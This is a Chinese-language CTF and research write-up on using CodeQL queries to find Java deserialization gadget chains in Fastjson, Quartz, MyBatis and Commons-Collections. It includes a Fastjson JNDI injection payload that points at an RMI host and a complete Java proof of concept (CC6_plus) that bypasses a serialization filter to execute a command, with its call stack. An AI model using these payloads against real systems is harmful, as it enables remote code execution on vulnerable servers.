@@ -1,0 +1,406 @@
+## 一些对CodeQL的运用
+
+### Fastjson
+
+对于fastjson来说，规律性挺强的
+
+对于Getter和Setter都有着明确的要求
+
+对于Getter方法来说
+
+  1. 没有参数
+
+  2. 是public方法
+
+  3. 以get字符开头且方法总长度大于3
+
+我们就可以构造对应的类
+
+    
+    
+    class FastJsonGetMethod extends Method{
+      FastJsonGetMethod(){
+          this.hasNoParameters() and
+          this.isPublic() and
+          this.getName().indexOf("get") = 0 and
+          this.getName().length() > 3
+      }
+    }
+    
+
+对于Setter方法来说
+
+  1. 存在一个参数
+
+  2. 是public方法
+
+  3. 方法长度大于3且以set字符开头
+
+  4. 返回类型为void
+
+使用codeql语法构造对应类
+
+    
+    
+    class FastJsonSetMethod extends Method{
+      FastJsonSetMethod(){
+          this.getNumberOfParameters() = 1 and
+          this.isPublic() and
+          this.getName().length() > 3 and
+          this.getName().indexOf("set") = 0 and
+          exists(VoidType void | 
+              void = this.getReturnType()
+              )
+      }
+    }
+    
+
+而对于我们需要的到达的目的sink，我们这里测试的是JNDI注入，所以其特征就是
+
+  1. lookup方法
+
+  2. 包名为`javax.naming.Context`
+
+最后判断source和sink之间的连通性，我们这里使用`edges`谓词(同样可以使用`TaintTracking::Configuration`进行污点跟踪)
+
+    
+    
+    query predicate edges(Callable a, Callable b) { 
+        a.polyCalls(b) 
+    }
+    
+
+意味着在a中调用了b方法
+
+最后完整的ql为
+
+    
+    
+    /**
+     * @kind path-problem
+     */
+    
+    import java
+    
+    class LookupMethod extends Call {
+      LookupMethod() {
+        this.getCallee().getDeclaringType().getASupertype*().hasQualifiedName("javax.naming", "Context") and
+        this.getCallee().hasName("lookup")
+      }
+    }
+    
+    class FastJsonGetMethod extends Method{
+      FastJsonGetMethod(){
+          this.hasNoParameters() and
+          this.isPublic() and
+          this.getName().indexOf("get") = 0 and
+          this.getName().length() > 3
+      }
+    }
+    
+    class FastJsonSetMethod extends Method{
+      FastJsonSetMethod(){
+          this.getNumberOfParameters() = 1 and
+          this.isPublic() and
+          this.getName().length() > 3 and
+          this.getName().indexOf("set") = 0 and
+          exists(VoidType void | 
+              void = this.getReturnType()
+              )
+      }
+    }
+    
+    class FastJsonCallable extends Callable {
+      FastJsonCallable() {
+        this instanceof FastJsonGetMethod or
+        this instanceof FastJsonSetMethod
+      }
+    }
+    
+    query predicate edges(Callable a, Callable b) { a.polyCalls(b) }
+    
+    from LookupMethod dst, FastJsonCallable src, Callable c
+    where
+      dst.getCallee() = c and
+      edges+(src, c)
+    select dst.getCaller(), dst.getCaller(), "jndi"
+    
+
+#### SUSCTF gadeget
+
+在这个CTF比赛中就存在有fastjson JNDI链的挖掘过程，分析一下
+
+这题的预期解就是通过从Lib依赖中挖掘新链
+
+这里操作的是https://github.com/quartz-scheduler/quartz
+
+之后git done, 构建数据库之后导入到vscode中
+
+使用我们上面的ql规则查询一下
+
+![image-20220903160749937.png](https://image.3001.net/images/20220904/1662221655_63137d57eec6065bf7030.png!small)
+
+在这里没有找到题目中所说的利用链是因为题目讲`getTransaction`改为了public方法，所以能够形成利用链，也不影响，我们深入代码看一下
+
+![image-20220903160935096.png](https://image.3001.net/images/20220904/1662221664_63137d60700e8f76db957.png!small)
+
+这里调用了lookup方法，且参数是类属性，且存在对应的setter方法，所以能够形成链子
+
+    
+    
+    [{"@type":"org.quartz.impl.jdbcjobstore.JTANonClusteredSemaphore","TransactionManagerJNDIName":"rmi://ip:port/h"},{"$ref":"$[0].Transaction"}]
+    // $ref是在fastjson>=1.2.36之后可以调用任意的getter方法
+    
+
+#### 挖掘第三方依赖
+
+同样可以挖掘其他依赖库的链子
+
+  * Mybatis
+
+项目下载https://github.com/mybatis/mybatis-3
+
+在成功构建数据库之后进行查询操作
+
+![image-20220903161913815.png](https://image.3001.net/images/20220904/1662221673_63137d696eb613d1b06f4.png!small)
+
+![image-20220903161946845.png](https://image.3001.net/images/20220904/1662221679_63137d6fc635915d8964b.png!small)
+
+正好就是已知的fastjson利用链
+
+正好就是`1.2.45`版本中的黑名单绕过
+
+![image-20220903162130136.png](https://image.3001.net/images/20220904/1662221686_63137d76a55092ccc46e6.png!small)
+
+### CC链
+
+#### MRCTF2022 ezjava
+
+当时在做这道题的时候是通过idea的各种功能找到的
+
+这里参考一下codeql的利用链挖掘
+
+这里通过serializeKiller这个项目进行了过滤，过滤掉了ysoserial中的常见payload
+
+![image-20220903233606762.png](https://image.3001.net/images/20220904/1662221694_63137d7ebc9c4001ff4df.png!small)
+
+我们需要找到相应的替代类
+
+对于CC链来说，主要是通过transformer方法的调用进而达到命令执行的目的
+
+对于已经过滤得类来说，我们需要找到相同功能的类需要寻找到一个由transformer的调用到contructor.newInstance的实例化的路径
+
+首先来看看能够调用newInstance的类方法
+
+    
+    
+    class NewChainInstanceCall extends Call {
+        NewChainInstanceCall() {
+            this.getCallee().getDeclaringType() instanceof TypeConstructor and
+            this.getCallee().hasName("newInstance")
+        }
+    }
+    
+
+![image-20220903234819756.png](https://image.3001.net/images/20220904/1662221702_63137d86ee1822b7a6ed0.png!small)
+
+通过上面的规则，我找到了三个调用的类
+
+其中有一个直接方法名为transformer方法，肯定可以调用
+
+![image-20220903235032852.png](https://image.3001.net/images/20220904/1662221710_63137d8e058f49e4cd2b1.png!small)
+
+it is pity~已经被过滤了
+
+然后其他两个类虽然不是在transformer方法中进行了newInstance方法的调用，但是也可能存在调用链
+
+我们再次编写ql规则，获取存在transform方法调用的类
+
+    
+    
+    class SourceCallable extends Callable {
+        SourceCallable() {
+        getName().matches("transform") and
+        not getDeclaringType() instanceof Interface and
+        getNumberOfParameters() = 1 and
+        not getDeclaringType().hasName("InvokerTransformer") and
+        not getDeclaringType().hasName("ChainedTransformer") and
+        not getDeclaringType().hasName("ConstantTransformer") and
+        not getDeclaringType().hasName("InstantiateTransformer")
+      }
+    }
+    
+
+![image-20220903235500501.png](https://image.3001.net/images/20220904/1662221718_63137d96aac738f752c69.png!small)
+
+可以看出结果还是有一定规模的，我们之后通过edges谓词查看两个是否存在互通的链子
+
+    
+    
+    /**
+     * @kind path-problem
+     */
+    import java
+    
+    class NewChainInstanceCall extends Call {
+        NewChainInstanceCall() {
+            this.getCallee().getDeclaringType() instanceof TypeConstructor and
+            this.getCallee().hasName("newInstance") and
+            not getCaller().getDeclaringType().hasName("InvokerTransformer") and
+            not getCaller().getDeclaringType().hasName("ChainedTransformer") and
+            not getCaller().getDeclaringType().hasName("ConstantTransformer") and
+            not getCaller().getDeclaringType().hasName("InstantiateTransformer")
+        }
+    }
+    class SourceCallable extends Callable {
+        SourceCallable() {
+        getName().matches("transform") and
+        not getDeclaringType() instanceof Interface and
+        getNumberOfParameters() = 1 and
+        not getDeclaringType().hasName("InvokerTransformer") and
+        not getDeclaringType().hasName("ChainedTransformer") and
+        not getDeclaringType().hasName("ConstantTransformer") and
+        not getDeclaringType().hasName("InstantiateTransformer")
+      }
+    }
+    query predicate edges(Callable a, Callable b) { a.polyCalls(b) }
+    
+    from  NewChainInstanceCall endcall, SourceCallable entryPoint,Callable endCallAble
+    where endcall.getCallee() = endCallAble and
+      edges+(entryPoint, endCallAble)
+    select endcall.getCaller(), entryPoint, endcall.getCaller(), "cc"
+    
+
+![image-20220903235645008.png](https://image.3001.net/images/20220904/1662221727_63137d9fa342d3630d601.png!small)
+
+幸运的是，我们似乎发现了新的调用
+
+我们可以按照CC链的思路，能够调用任意的transform方法
+
+![image-20220903235746839.png](https://image.3001.net/images/20220904/1662221733_63137da5ee43d93c358cf.png!small)
+
+在FactoryTransformer方法就存在调用，且调用了任意类的create方法
+
+![image-20220903235841761.png](https://image.3001.net/images/20220904/1662221740_63137daca7645fd743fe3.png!small)
+
+在`InstantiateFactory`中的create方法中又存在构造函数的实例化
+
+这里我们可以知道在CC6链中使用`TrAXFilter`类结合TemplateIml类进行利用
+
+所以说POC
+
+    
+    
+    package pers.cc;
+    
+    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+    import javassist.ClassPool;
+    import javassist.CtClass;
+    import org.apache.commons.collections.functors.ConstantTransformer;
+    import org.apache.commons.collections.functors.FactoryTransformer;
+    import org.apache.commons.collections.functors.InstantiateFactory;
+    import org.apache.commons.collections.keyvalue.TiedMapEntry;
+    import org.apache.commons.collections.map.LazyMap;
+    
+    import java.io.ByteArrayInputStream;
+    import java.io.ByteArrayOutputStream;
+    import java.io.ObjectInputStream;
+    import java.io.ObjectOutputStream;
+    import java.lang.reflect.Field;
+    import java.util.HashMap;
+    import java.util.Map;
+    
+    public class CC6_plus {
+        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+            Field field = obj.getClass().getDeclaredField(fieldName);
+            field.setAccessible(true);
+            field.set(obj, value);
+        }
+        public static void main(String[] args) throws Exception{
+            //生成恶意的bytecodes
+            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
+            ClassPool classPool = ClassPool.getDefault();
+            CtClass ctClass = classPool.makeClass("evilexp");
+            ctClass.makeClassInitializer().insertBefore(cmd);
+            ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
+            byte[] bytes = ctClass.toBytecode();
+    
+            TemplatesImpl obj = new TemplatesImpl();
+            setFieldValue(obj, "_bytecodes", new byte[][]{
+                    bytes
+            });
+            setFieldValue(obj, "_name", "1");
+            setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+            InstantiateFactory instantiateFactory;
+            instantiateFactory = new InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class
+                    ,new Class[]{javax.xml.transform.Templates.class},new Object[]{obj});
+    
+            FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);
+    
+            ConstantTransformer constantTransformer = new ConstantTransformer(1);
+    
+            Map innerMap = new HashMap();
+            LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, constantTransformer);
+    
+            TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
+    
+            Map expMap = new HashMap();
+            expMap.put(tme, "valuevalue");
+            setFieldValue(outerMap,"factory",factoryTransformer);
+    
+            outerMap.remove("keykey");
+            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+    
+            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+            objectOutputStream.writeObject(expMap);
+    
+            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
+            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+            objectInputStream.readObject();
+        }
+    }
+    
+
+调用栈为
+
+    
+    
+    exec:347, Runtime (java.lang)
+    <clinit>:-1, evilexp
+    newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) [2]
+    newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
+    newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
+    newInstance:423, Constructor (java.lang.reflect)
+    newInstance:442, Class (java.lang)
+    getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+    newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
+    <init>:58, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)
+    newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) [1]
+    newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
+    newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
+    newInstance:423, Constructor (java.lang.reflect)
+    create:128, InstantiateFactory (org.apache.commons.collections.functors)
+    transform:72, FactoryTransformer (org.apache.commons.collections.functors)
+    get:151, LazyMap (org.apache.commons.collections.map)
+    getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
+    hashCode:120, TiedMapEntry (org.apache.commons.collections.keyvalue)
+    hash:339, HashMap (java.util)
+    readObject:1413, HashMap (java.util)
+    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+    invoke:62, NativeMethodAccessorImpl (sun.reflect)
+    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+    invoke:498, Method (java.lang.reflect)
+    invokeReadObject:1170, ObjectStreamClass (java.io)
+    readSerialData:2178, ObjectInputStream (java.io)
+    readOrdinaryObject:2069, ObjectInputStream (java.io)
+    readObject0:1573, ObjectInputStream (java.io)
+    readObject:431, ObjectInputStream (java.io)
+    main:69, CC6_plus (pers.cc)
+    
+
+## Ref
+
+https://www.secpulse.com/archives/180773.html
+
